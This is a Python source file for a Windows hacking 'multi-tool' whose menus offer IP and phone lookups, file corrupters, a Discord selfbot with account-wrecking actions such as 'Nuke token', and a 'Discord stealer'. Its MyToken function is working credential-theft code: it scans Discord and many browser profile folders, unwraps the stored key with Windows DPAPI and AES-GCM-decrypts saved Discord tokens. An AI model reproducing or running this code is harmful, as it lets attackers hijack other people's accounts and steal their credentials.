from colorama import Fore, Back, Style, init
import requests
import os
import socket
import platform
import uuid
import time
import sys
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
from phonenumbers import is_valid_number, is_possible_number, region_code_for_number, number_type
from phonenumbers import format_number, PhoneNumberFormat
from phonenumbers.phonenumberutil import PhoneNumberType, number_type
import PIL.Image
import PIL.ExifTags
import re
import webbrowser
import random
import win32api
import win32con
import win32gui
import ctypes
import threading
import string
import win32crypt
import base64
import json
from Crypto.Cipher import AES
import httpx
import asyncio
import subprocess
import shutil

init(convert=True)

bracketopen = f"{Fore.GREEN}[{Style.RESET_ALL}"
bracketclosed = f"{Fore.GREEN}]{Style.RESET_ALL}"

bracketopen2 = f"{Fore.WHITE}[{Style.RESET_ALL}"
bracketclosed2 = f"{Fore.WHITE}]{Style.RESET_ALL}"

Next = f"{bracketopen}+{bracketclosed} Next"
Back = f"{bracketopen}+{bracketclosed} Back"

response = requests.get("https://api.ipify.org")
public_ip = response.text

system_version = platform.platform()

pc_name = platform.node()
username = os.getlogin()

is_windows = os.name == "nt"
system_text = "Windows" if is_windows else "Linux"

BaseURL = "https://discord.com/api/v9"

succesStatus = [200, 204, 201]

discord_banner = (f"""{Fore.GREEN}
                                              @@@@                @%@@                                      
                                       @@@@@@@@@@@@               @@@@@@@@@@%                               
                                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                          
                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                         
                                %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                        
                               @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                       
                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                     
                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                    
                           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                   
                          %@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@%                  
                          %@@@@@@@@@@@@@@@@        %@@@@@@@@@@@%@        @@@@@@@@@@@@@@@@@                  
                          %@@@@@@@@@@@@@@@          @@@@@@@@@@@@          @@@@@@@@@@@@@@@%                  
                         %@@@@@@@@@@@@@@@@          @@@@@@@@@@@%          %@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@%         @@@@@@@@@@@%         %@@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@@@      %@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@%                 
                         %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                           @%@@@@@@@@@@@@@%@@   @@@@%@@@@@@@@@%%%@%@@  @@@@@@@@@@@@@@@@@@                   
                              @@%@@@@@@@@@@@@@                        @%@@@@@@@@@@@%@@                      
                                   @%@@@@@@@                            @@@@@@%%@                           
                                         @@                              @@        
{Style.RESET_ALL}                                     
""")

lookup_banner = (f"""{Fore.GREEN}

                                          ...:----:...                                              
                                     .:=#@@@@@@@@@@@@@@%*-..                                        
                                  .:#@@@@@@@%#*****#%@@@@@@@+..                                     
                               ..-@@@@@%-...... ........+@@@@@@..                                   
                               :%@@@@=..   .#@@@@@@@@#=....+@@@@*.                                  
                             .+@@@@=.      .*@@@%@@@@@@@@=...*@@@@:.                                
                            .#@@@%.                 .=@@@@@=. .@@@@-.                               
                           .=@@@#.                    .:%@@@*. -@@@%:.                              
                           .%@@@-                       .*@@*. .+@@@=.                              
                           :@@@#.                              .-@@@#.                              
                           -@@@#                                :%@@@.                              
                           :@@@#.                              .-@@@#.                              
                           .%@@@-.                             .+@@@=.                              
                           .+@@@#.                             -@@@%:.                              
                            .*@@@%.                          .:@@@@-.                               
                             .+@@@@=..                     ..*@@@@:.                                
                               :%@@@@-..                ...+@@@@*.                                  
                               ..-@@@@@%=...         ...*@@@@@@@@#.                                 
                                  .:*@@@@@@@%*++++**@@@@@@@@=:*@@@@#:.                              
                                     ..=%@@@@@@@@@@@@@@%#-.   ..*@@@@%:.                            
                                        .....:::::::....       ...+@@@@%:                           
                                                                  ..+@@@@%-.                        
                                                                    ..=@@@@%-.                      
                                                                      ..=@@@@@=.                    
                                                                         .=%@@@@=.                  
                                                                          ..-%@@@-.                 
                                                                             ....
{Style.RESET_ALL}
""")

map_banner = (f"""{Fore.GREEN}
                                      :**+ :::+*@@.                                                         
                              +: @ = =.  :#@@@@@@@@                 :     .=*@@#     -                      
                 @@@@-. :=: +@@.:% *=@@:   @@@@@@          :#=::     .:@=@@@@@@@@@@@@@@@@@@@@--.-:          
             .#@@@@@@@@@@@@@@@@@@:# .@@   #@@    :@-     +@@:@@@+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*        
             #*   :%@@@@@@@@@@:   .@@#*              ..  ##@ *#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-:- %=         
                   *@@@@@@@@@@@@%@@@@@@@            = @=+@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+   #.        
                   #@@@@@@@@@##@@@@@= =#              #@@@#@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=            
                  @@@@@@@@@@@#+#@@=                 :@@@-.#-*#@.  .@@.=%@@@@%@@@@@@@@@@@@@@@@@=  +          
                 :@@@@@@@@@@@@@@:                   :@@    # - @@@@@@@ =@@@*#*@@@@@@@@@@@@@=.=-  #:         
                  :@@@@@@@@@@@+                     @@@@@@@: :    @@@@@@@@@@@@@@@@@@@@@@@@@@@               
                   #@@@@@    @                     #%@@@@@@@@@@@@@@@@@:@@@@@@@@@@@@#@@@@@@@@@:              
                     @@@     .                    @@@@@@@@@@@@@@@@-%@@@%@#   @@@@@@#=@#@@@@@==              
                     =@@##@   =:*.                @@@@@@*@@@@@@@@@@-=@@@@.    +@@@:  %#@@#=   :             
                         .=@.                     #@@@@@@@@#@@@@@@@@+#:        %@      *%@=                 
                            . @@@@@@               @#@@*@@@@@@@@@@@@@@@=        :-     -       =.           
                             :@@@@@@@#=                   @@@@@@@@@@@@-               :+%  .@=              
                            -@@@@@@@@@@@@                 @+@@@@*+@@#                   @. @@.#   # :       
                             @@@@@@@@@@@@@@@               @@@@@*@@@                     :=.        @@@.    
                              @@@@@@@@@@@@@                #@@@@@@%@.                             :  :      
                               *@@@@@@@@@@%               :@@@@@@@@@ @@.                      .@@@@=:@      
                                :@@@@@@@@@                 #@@@@@@   @:                    .#@@@@@@@@@@     
                                :@@@@%@@                   .@@@@@-   .                     @@@@@@@@@@@@*    
                                :@@@@@@.                    *@@@-                          @@@@#@@@@@@@     
                                .@@@@@                                                           =@@@:    @=
                                 =@@                                                              =    #+   
                                  @%                                                                        
{Style.RESET_ALL}
""")

analyze_banner = (f"""{Fore.GREEN}
                                                            >@@|                                                
                                                            >@@|                                                
                                                            >@@|                                                
                                                            >@@|                                                
                                                   >|a@@@@@@@@@|                                                
                                              )@@@@@@@@@@@@@@@@| 000M|                                          
                                          ;@@@@@@O  @@@@@@@@@@@|  j000000_                                      
                                       )@@@@@v   |@@@@@@@@@@@@@| 00J  |00000j                                   
                                     @@@@@_     @@@@@@@@@@@@@@@| 0000    ;00000^                                
                                  ;@@@@v       _@@@@@@@     >@@| 0000v      )0000_                              
                                ^@@@@_         @@@@@@@      ^O@| 00000        ;0000_                            
                                 @@@@;         @@@@@@@      ;p@| 00000         0000^                            
                                   @@@@p       >@@@@@@@^    >@@| 0000v      J0000;                              
                                     O@@@@|     M@@@@@@@@@@@@@@| 0000    >00000                                 
                                       ;@@@@@J^  )@@@@@@@@@@@@@| 00v  j00000)                                   
                                          >@@@@@@@_;@@@@@@@@@@@| ;M000000_                                      
                                              >@@@@@@@@@@@@@@@@| 00000)                                          
                                                   ^jpM@@@@@@@@|                                                
                                                            >@@|                                                
                                                            >@@|                                                
                                                            >@@|                                                
                                                            >@@|                                                
                                                            >@@| 
{Style.RESET_ALL}
""")

osint_banner = (f"""{Fore.GREEN}
                                          ...:----:...                                              
                                     .:=#@@@@@@@@@@@@@@%*-..                                        
                                  .:#@@@@@@@%#*****#%@@@@@@@+..                                     
                               ..-@@@@@%-...... ........+@@@@@@..                                   
                               :%@@@@=..   .#@@@@@@@@#=....+@@@@*.                                  
                             .+@@@@=.      .*@@@%@@@@@@@@=...*@@@@:.                                
                            .#@@@%.                 .=@@@@@=. .@@@@-.                               
                           .=@@@#.                    .:%@@@*. -@@@%:.                              
                           .%@@@-                       .*@@*. .+@@@=.                              
                           :@@@#.                              .-@@@#.                              
                           -@@@#                                :%@@@.                              
                           :@@@#.                              .-@@@#.                              
                           .%@@@-.                             .+@@@=.                              
                           .+@@@#.                             -@@@%:.                              
                            .*@@@%.                          .:@@@@-.                               
                             .+@@@@=..                     ..*@@@@:.                                
                               :%@@@@-..                ...+@@@@*.                                  
                               ..-@@@@@%=...         ...*@@@@@@@@#.                                 
                                  .:*@@@@@@@%*++++**@@@@@@@@=:*@@@@#:.                              
                                     ..=%@@@@@@@@@@@@@@%#-.   ..*@@@@%:.                            
                                        .....:::::::....       ...+@@@@%:                           
                                                                  ..+@@@@%-.                        
                                                                    ..=@@@@%-.                      
                                                                      ..=@@@@@=.                    
                                                                         .=%@@@@=.                  
                                                                          ..-%@@@-.                 
                                                                             ....
{Style.RESET_ALL}
""")

file_banner = (f"""{Fore.GREEN}
                                                       j@@@@@^                                 
                           _@v   p@@@@j           j@@@@@@@@@@@@@@@;          |@@@@M   v@)      
                          @@@@@) >@@@@    v@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@p    @@@@_ _@@@@@     
                          >@@@v    @@     v@@@@@@@@@@@@      p@@@@@@@@@@@a     @@    j@@@_     
                           ^@@     @@@@   |@@@@@@@@@@^ @@@@@@; @@@@@@@@@@p   p@@@     M@;      
                           ^@@            >@@@@@@@@@@ p@@@@@@@ M@@@@@@@@@j            M@;      
                           ^@@@@@@@@@@@)   @@@@@@@@|            >@@@@@@@@;   @@@@@@@@@@@;      
                                           )@@@@@@@|    O@@@    >@@@@@@@M                      
                          |@@@@             @@@@@@@|     M@     >@@@@@@@^            @@@@j     
                          @@@@@@@@@@@@@@@>   @@@@@@|    O@@@    >@@@@@@    @@@@@@@@@@@@@@@     
                            ^                 @@@@@v            )@@@@@^                ^       
                                 p@@@@@@@@@^   M@@@@@@@@@@@@@@@@@@@@@    @@@@@@@@@p            
                                 p@_            ^@@@@@@@@@@@@@@@@@@>            >@a            
                                @@@@O              @@@@@@@@@@@@@@              J@@@@           
                               ;@@@@@                 J@@@@@@p                 @@@@@>          
                                  ;              p@              p@>  M@@_       ;             
                                          @@@@p  p@_  ;      j_  a@@@@@@@@j                    
                                         ^@@@@@@@@@   v@_   O@)       M@@_                     
                                            ;         p@|   O@)      ))                        
                                                    >@@@@@  O@@@@@@@@@@@J                      
                                                     p@@@j         ;@@@@^
{Style.RESET_ALL}
""")

password_banner = (f"""{Fore.GREEN}
                                         ^M@@@@@@@@@v                                    
                                      v@@@@@@@@@@@@@@@@@                                 
                                    _@@@@@@@)    ;a@@@@@@@                               
                                   M@@@@@            @@@@@@                              
                                  ;@@@@@              O@@@@@                             
                                  @@@@@v               @@@@@                             
                                  @@@@@;               @@@@@                             
                                  @@@@@;                                                 
                                  @@@@@;        v@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         
                                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@       
                                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@      
                                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@      
                                             @@@@@@@@@@@@@@@@j     @@@@@@@@@@@@@@@@      
                                             @@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@      
                                             @@@@@@@@@@@@@@@v       @@@@@@@@@@@@@@@      
                                             @@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@      
                                             @@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@      
                                             @@@@@@@@@@@@@@@@@_   @@@@@@@@@@@@@@@@@      
                                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@      
                                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@|      
                                               ^@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@O                                              
{Style.RESET_ALL}
""")

Selfbot_banner = (f"""{Fore.GREEN}
███████╗███████╗██╗     ███████╗██████╗  ██████╗ ████████╗
██╔════╝██╔════╝██║     ██╔════╝██╔══██╗██╔═══██╗╚══██╔══╝
███████╗█████╗  ██║     █████╗  ██████╔╝██║   ██║   ██║   
╚════██║██╔══╝  ██║     ██╔══╝  ██╔══██╗██║   ██║   ██║   
███████║███████╗███████╗██║     ██████╔╝╚██████╔╝   ██║   
╚══════╝╚══════╝╚══════╝╚═╝     ╚═════╝  ╚═════╝    ╚═╝{Style.RESET_ALL}                     
""")

banner = (f"""{Fore.GREEN}
                        ██████╗  █████╗ ███╗   ██╗██╗ ██████╗    ████████╗ ██████╗  ██████╗ ██╗     
                        ██╔══██╗██╔══██╗████╗  ██║██║██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
                        ██████╔╝███████║██╔██╗ ██║██║██║            ██║   ██║   ██║██║   ██║██║     
                        ██╔═══╝ ██╔══██║██║╚██╗██║██║██║            ██║   ██║   ██║██║   ██║██║     
                        ██║     ██║  ██║██║ ╚████║██║╚██████╗       ██║   ╚██████╔╝╚██████╔╝███████╗
                        ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝ ╚═════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                                                             ~ https://github.com/0xN0WHERE
{Style.RESET_ALL}                            
""")

#Selfbot features
unfriend = f"{bracketopen}01{bracketclosed} Unfriend everyone"
DmEveryone = f"{bracketopen}02{bracketclosed} Message all open dms"
CloseDms = f"{bracketopen}03{bracketclosed} Close all dms"
LeaveGroups = f"{bracketopen}04{bracketclosed} Leave all groups"
LeaveServers = f"{bracketopen}05{bracketclosed} Leave all servers"
Nuke = f"{bracketopen}06{bracketclosed} Nuke token"
MainMenu = f"{bracketopen}07{bracketclosed} Main menu"

SelfbotMenu = f"""
{Fore.GREEN}{Style.RESET_ALL}{unfriend} {Fore.GREEN}
{Style.RESET_ALL}{DmEveryone} {Fore.GREEN}
{Style.RESET_ALL}{CloseDms} {Fore.GREEN}
{Style.RESET_ALL}{LeaveGroups} {Fore.GREEN}
{Style.RESET_ALL}{LeaveServers} {Fore.GREEN}
{Style.RESET_ALL}{Nuke} {Fore.GREEN}
{Style.RESET_ALL}{MainMenu} {Fore.GREEN}
{Style.RESET_ALL}"""

#Menu1
title1 = "Osint"
title2 = "Files & Control"
title3 = "Passwords"

#Osint
lookupIP = f"{bracketopen}01{bracketclosed} Ip lookup"
lookupPhone = f"{bracketopen}02{bracketclosed} Phone lookup"
ExifExtractor = f"{bracketopen}03{bracketclosed} Metadata extractor"
OsintFrameworkWeb = f"{bracketopen}04{bracketclosed} Osint framework"

#Files & Control
FileCorrupt = f"{bracketopen}05{bracketclosed} File corrupter"
ImageCorrupt = f"{bracketopen}06{bracketclosed} Image corrupter"
FileErase = f"{bracketopen}07{bracketclosed} File eraser"
ScreenCapture = f"{bracketopen}08{bracketclosed} Anti screen capture"

#Passwords
PasswordGen = f"{bracketopen}09{bracketclosed} Password gen"
PasswordCheck = f"{bracketopen}10{bracketclosed} Password checker"

"     ╔ ═   ╗     ╚    ╝  ║ "

menu1 = (f"""{Fore.GREEN}
              ╔═════════  {title1}  ═════════╗    ╔════  {title2}  ════╗    ╔═══════  {title3}  ═══════╗
              ║ {Style.RESET_ALL}{lookupIP} {Fore.GREEN}           ║    ║ {Style.RESET_ALL}{FileCorrupt} {Fore.GREEN}      ║    ║ {Style.RESET_ALL}{PasswordGen} {Fore.GREEN}        ║
              ║ {Style.RESET_ALL}{lookupPhone} {Fore.GREEN}        ║    ║ {Style.RESET_ALL}{ImageCorrupt} {Fore.GREEN}     ║    ║ {Style.RESET_ALL}{PasswordCheck} {Fore.GREEN}    ║
              ║ {Style.RESET_ALL}{ExifExtractor} {Fore.GREEN}  ║    ║ {Style.RESET_ALL}{FileErase} {Fore.GREEN}         ║    ║                           ║
              ║ {Style.RESET_ALL}{OsintFrameworkWeb} {Fore.GREEN}     ║    ║ {Style.RESET_ALL}{ScreenCapture} {Fore.GREEN} ║    ║                           ║
              ║                           ║    ║                           ║    ║                           ║
              ║                           ║    ║                           ║    ║                           ║
              ╚═══════════════════════════╝    ╚═══════════════════════════╝    ╚═══════════════════════════║
                                                                                                            ╚═ {Style.RESET_ALL}{Next}{Fore.GREEN}      
{Style.RESET_ALL}""")

#Menu2
Menu2Title1 = "Discord"
Menu2Title2 = "Files & Control"
Menu2Title3 = "Passwords"

#Discord
Selfbot = f"{bracketopen}11{bracketclosed} Selfbot menu"
DiscordCloner = f"{bracketopen}12{bracketclosed} Server cloner"
DiscordStealer = f"{bracketopen}13{bracketclosed} Discord stealer"

menu2 = (f"""{Fore.GREEN}
                                               ╔════════  {Menu2Title1}  ════════╗
                                               ║ {Style.RESET_ALL}{Selfbot} {Fore.GREEN}        ║
                                               ║ {Style.RESET_ALL}{DiscordCloner} {Fore.GREEN}       ║
                                               ║ {Style.RESET_ALL}{DiscordStealer} {Fore.GREEN}     ║
                                               ║                           ║
                                               ║                           ║
                                               ║                           ║
                                               ║═══════════════════════════╝
                                     {Style.RESET_ALL}{Back}{Fore.GREEN} ═╝
{Style.RESET_ALL}""")

def MyToken():
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    PATHS = {
        'Discord': ROAMING + '\\discord',
        'Discord Canary': ROAMING + '\\discordcanary',
        'Lightcord': ROAMING + '\\Lightcord',
        'Discord PTB': ROAMING + '\\discordptb',
        'Opera': ROAMING + '\\Opera Software\\Opera Stable',
        'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
        'Amigo': LOCAL + '\\Amigo\\User Data',
        'Torch': LOCAL + '\\Torch\\User Data',
        'Kometa': LOCAL + '\\Kometa\\User Data',
        'Orbitum': LOCAL + '\\Orbitum\\User Data',
        'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
        '7Star': LOCAL + '\\7Star\\7Star\\User Data',
        'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
        'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
        'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
        'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
    }

    def getkey(path):
        with open(path + f"\\Local State", "r") as file:
            key = json.loads(file.read())['os_crypt']['encrypted_key']
            file.close()

        return key

    def gettokens(path):
        path += "\\Local Storage\\leveldb\\"
        tokens = []

        if not os.path.exists(path):
            return tokens

        for file in os.listdir(path):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue

            try:
                with open(f"{path}{file}", "r", errors="ignore") as f:
                    for line in (x.strip() for x in f.readlines()):
                        for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            tokens.append(values)
            except PermissionError:
                continue
        return tokens
    checked = []
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token
            try:
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)
            except Exception as e:
                pass
    return token

def Slow(banner):
    delai = 0.03
    lignes = banner.split('\n')
    for ligne in lignes:
        print(ligne)
        time.sleep(delai)